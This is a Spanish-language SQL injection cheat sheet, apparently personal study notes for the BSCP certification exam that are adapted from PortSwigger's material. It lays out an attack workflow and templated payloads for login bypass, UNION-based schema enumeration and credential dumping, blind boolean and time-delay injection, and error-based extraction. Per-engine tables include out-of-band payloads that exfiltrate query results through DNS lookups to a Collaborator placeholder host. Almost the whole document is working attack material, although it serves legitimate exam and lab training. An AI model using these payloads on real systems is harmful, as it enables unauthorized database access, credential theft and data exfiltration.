---
tipo: cheatsheet
vuln: sqli
tags: [bscp, tipo/cheatsheet, vuln/sqli]
relacionada: "[[SQL-Injection]]"
---

# CS · SQL Injection

## Flujo repetible
1. Inyecta una comilla en {{PARAM}} y observa error/cambio.
2. Determina el contexto (string vs numérico) y el motor.
3. Elige técnica: in-band (UNION) > error-based > blind boolean > blind time.
4. Enumera esquema y extrae credenciales de {{TARGET_USER}}.
5. Escala: login como admin → objetivo del examen.

## Detección
```sql
-- Detección
'                      -- rompe la query
' OR '1'='1            -- respuesta distinta => inyectable
```

## Plantillas de payload
```sql
-- Bypass de login (plantilla)
{{TARGET_USER}}'--
' OR 1=1--
```
```sql
-- Nº de columnas y columna de texto
' ORDER BY {{N}}--
' UNION SELECT NULL,...,NULL--          -- {{N}} NULLs
' UNION SELECT 'a',NULL--               -- localizar columna string
```
```sql
-- Versión del motor (según cuál responda)
' UNION SELECT @@version,NULL--                    -- MySQL/MSSQL
' UNION SELECT version(),NULL--                    -- PostgreSQL
' UNION SELECT banner,NULL FROM v$version--        -- Oracle (usa FROM dual)
```
```sql
-- Enumeración y extracción
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='{{TABLE}}'--
' UNION SELECT username,password FROM {{TABLE}}--
```
```sql
-- Blind booleana / substring
' AND SUBSTRING((SELECT password FROM {{TABLE}} WHERE username='{{TARGET_USER}}'),{{N}},1)='a
```
```sql
-- Blind por tiempo (elige motor)
'; IF (1=1) WAITFOR DELAY '0:0:5'--                 -- MSSQL
' OR IF(1=1,SLEEP(5),0)--                           -- MySQL
'; SELECT pg_sleep(5)--                             -- PostgreSQL
' AND 1=(SELECT 1 FROM PG_SLEEP(5))--               -- PostgreSQL
```
```sql
-- OOB / exfil (Oracle) ⚠️
' UNION SELECT extractvalue(xmltype('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % x SYSTEM "http://{{COLLAB}}/">%x;]>'),'/l') FROM dual--
```

## Escalada al objetivo
Volcar credenciales de {{TARGET_USER}} → login → panel admin → leer {{SECRET_PATH}} / borrar usuario.

## Checklist
- [ ] Probé comilla simple y doble en {{PARAM}}
- [ ] Identifiqué el motor
- [ ] Determiné nº de columnas y columna de texto
- [ ] Enumeré tablas/columnas o usé blind
- [ ] Escalé a acceso admin

## Sintaxis por motor (cheat sheet oficial)
> Adaptado de la cheat sheet oficial de PortSwigger. Placeholders: `{{COND}}` condición · `{{TABLE}}` tabla · `{{SUBQ}}` subconsulta · `{{COLLAB}}` Collaborator.

### Concatenar cadenas
| Motor | Sintaxis |
|---|---|
| Oracle | `'foo'\|\|'bar'` |
| Microsoft | `'foo'+'bar'` |
| PostgreSQL | `'foo'\|\|'bar'` |
| MySQL | `'foo' 'bar'` (espacio entre ellas) · `CONCAT('foo','bar')` |

### Substring (offset 1-based; devuelve `ba`)
| Motor | Sintaxis |
|---|---|
| Oracle | `SUBSTR('foobar', 4, 2)` |
| Microsoft / PostgreSQL / MySQL | `SUBSTRING('foobar', 4, 2)` |

### Comentarios
| Motor | Sintaxis |
|---|---|
| Oracle | `--comentario` |
| Microsoft / PostgreSQL | `--comentario` · `/*comentario*/` |
| MySQL | `#comentario` · `-- comentario` (**espacio tras `--`**) · `/*comentario*/` |

### Versión del motor
| Motor | Sintaxis |
|---|---|
| Oracle | `SELECT banner FROM v$version` · `SELECT version FROM v$instance` |
| Microsoft | `SELECT @@version` |
| PostgreSQL | `SELECT version()` |
| MySQL | `SELECT @@version` |

### Contenido de la BD (tablas y columnas)
| Motor | Sintaxis |
|---|---|
| Oracle | `SELECT * FROM all_tables` · `SELECT * FROM all_tab_columns WHERE table_name = '{{TABLE}}'` |
| Microsoft / PostgreSQL / MySQL | `SELECT * FROM information_schema.tables` · `SELECT * FROM information_schema.columns WHERE table_name = '{{TABLE}}'` |

### Errores condicionales (error si `{{COND}}` es true)
| Motor | Sintaxis |
|---|---|
| Oracle | `SELECT CASE WHEN ({{COND}}) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
| Microsoft | `SELECT CASE WHEN ({{COND}}) THEN 1/0 ELSE NULL END` |
| PostgreSQL | `1 = (SELECT CASE WHEN ({{COND}}) THEN 1/(SELECT 0) ELSE NULL END)` |
| MySQL | `SELECT IF({{COND}},(SELECT table_name FROM information_schema.tables),'a')` |

### Extraer datos por mensaje de error
| Motor | Sintaxis |
|---|---|
| Microsoft | `SELECT 'foo' WHERE 1 = (SELECT '{{SUBQ}}')` → *Conversion failed…* |
| PostgreSQL | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)` → *invalid input syntax for integer* |
| MySQL | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT '{{SUBQ}}')))` → *XPATH syntax error* |

### Batched / stacked queries
| Motor | Sintaxis |
|---|---|
| Oracle | No soporta batched. |
| Microsoft / PostgreSQL / MySQL | `QUERY-1; QUERY-2` |
- ⚠️ En **MySQL** normalmente **no** sirve para SQLi (salvo ciertas APIs PHP/Python). Útil sobre todo en ciegas (DNS, error o time delay).

### Time delay (10 s, incondicional)
| Motor | Sintaxis |
|---|---|
| Oracle | `dbms_pipe.receive_message(('a'),10)` |
| Microsoft | `WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `SELECT pg_sleep(10)` |
| MySQL | `SELECT SLEEP(10)` |

### Time delay condicional (si `{{COND}}`)
| Motor | Sintaxis |
|---|---|
| Oracle | `SELECT CASE WHEN ({{COND}}) THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| Microsoft | `IF ({{COND}}) WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `SELECT CASE WHEN ({{COND}}) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
| MySQL | `SELECT IF({{COND}},SLEEP(10),'a')` |

### DNS lookup (OAST con Collaborator `{{COLLAB}}`)
| Motor | Sintaxis |
|---|---|
| Oracle (patchado, requiere privilegios) | `SELECT UTL_INADDR.get_host_address('{{COLLAB}}')` |
| Oracle (XXE, instalaciones sin parchear) | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{COLLAB}}/"> %remote;]>'),'/l') FROM dual` |
| Microsoft | `exec master..xp_dirtree '//{{COLLAB}}/a'` |
| PostgreSQL | `copy (SELECT '') to program 'nslookup {{COLLAB}}'` |
| MySQL (solo Windows) | `LOAD_FILE('\\\\{{COLLAB}}\\a')` · `SELECT ... INTO OUTFILE '\\\\{{COLLAB}}\a'` |

### DNS lookup + exfiltración (`{{SUBQ}}` en el subdominio)
| Motor | Sintaxis |
|---|---|
| Oracle | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'\|\|(SELECT {{SUBQ}})\|\|'.{{COLLAB}}/"> %remote;]>'),'/l') FROM dual` |
| Microsoft | `declare @p varchar(1024);set @p=(SELECT {{SUBQ}});exec('master..xp_dirtree "//'+@p+'.{{COLLAB}}/a"')` |
| PostgreSQL | función `plpgsql` con `copy ... to program 'nslookup <dato>.{{COLLAB}}'` (ver fuente oficial) |
| MySQL (solo Windows) | `SELECT {{SUBQ}} INTO OUTFILE '\\\\{{COLLAB}}\a'` |

## Referencias
- https://portswigger.net/web-security/sql-injection
- https://portswigger.net/web-security/sql-injection/cheat-sheet
